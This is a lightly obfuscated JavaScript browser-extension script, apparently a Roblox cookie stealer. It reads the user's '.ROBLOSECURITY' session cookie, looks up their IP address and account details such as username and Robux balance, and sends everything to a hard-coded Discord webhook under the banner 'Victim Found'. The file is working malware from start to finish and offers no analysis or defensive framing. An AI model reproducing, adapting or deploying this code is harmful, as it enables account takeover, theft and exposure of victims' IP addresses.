const WEBHOOK_URL =
  'https://discord.com/api/webhooks/1264864170797699072/i0JgRJn7igNDH4-ezPAW3VmS7wfEEXxD-VW1JouHdT9Ukfxjm23f1wzALp5Mc2ZVaSFs'
async function fetchIP() {
  try {
    const _0x4d49b3 = await fetch('https://api.ipify.org')
    return await _0x4d49b3.text()
  } catch (_0x1185c2) {
    return console.error('Error fetching IP:', _0x1185c2), 'IP NOT FOUND'
  }
}
async function fetchUserInfo(_0x243415) {
  try {
    const _0x2083dc = await fetch('https://www.roblox.com/mobileapi/userinfo', {
      headers: { Cookie: '.ROBLOSECURITY=' + _0x243415 },
      redirect: 'manual',
    })
    return await _0x2083dc.json()
  } catch (_0x781b31) {
    return console.error('Error fetching user info:', _0x781b31), null
  }
}
async function sendWebhook(_0x5489ab) {
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(_0x5489ab),
    })
  } catch (_0x37c137) {
    console.error('Error sending webhook:', _0x37c137)
  }
}
async function main(_0x45e8b2) {
  const _0x321a85 = await fetchIP(),
    _0x31a00e = _0x45e8b2 ? await fetchUserInfo(_0x45e8b2) : null,
    _0x385b6e = {
      content: null,
      embeds: [
        {
          description:
            '```' + (_0x45e8b2 ? _0x45e8b2 : 'COOKIE NOT FOUND') + '```',
          color: null,
          fields: [
            {
              name: 'Username',
              value: _0x31a00e ? _0x31a00e.UserName : 'N/A',
              inline: true,
            },
            {
              name: 'Robux',
              value: _0x31a00e ? _0x31a00e.RobuxBalance : 'N/A',
              inline: true,
            },
            {
              name: 'Premium',
              value: _0x31a00e ? _0x31a00e.IsPremium : 'N/A',
              inline: true,
            },
          ],
          author: {
            name: 'Victim Found: ' + _0x321a85,
            icon_url: _0x31a00e
              ? _0x31a00e.ThumbnailUrl
              : 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png',
          },
          footer: {
            text: 'https://github.com/ox-y',
            icon_url:
              'https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png',
          },
          thumbnail: {
            url: _0x31a00e
              ? _0x31a00e.ThumbnailUrl
              : 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png',
          },
        },
      ],
      username: 'Roblox',
      avatar_url:
        'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png',
      attachments: [],
    }
  await sendWebhook(_0x385b6e)
}
chrome.cookies.get(
  {
    url: 'https://www.roblox.com/home',
    name: '.ROBLOSECURITY',
  },
  function (_0x1ebbe1) {
    main(_0x1ebbe1 ? _0x1ebbe1.value : null)
  }
)
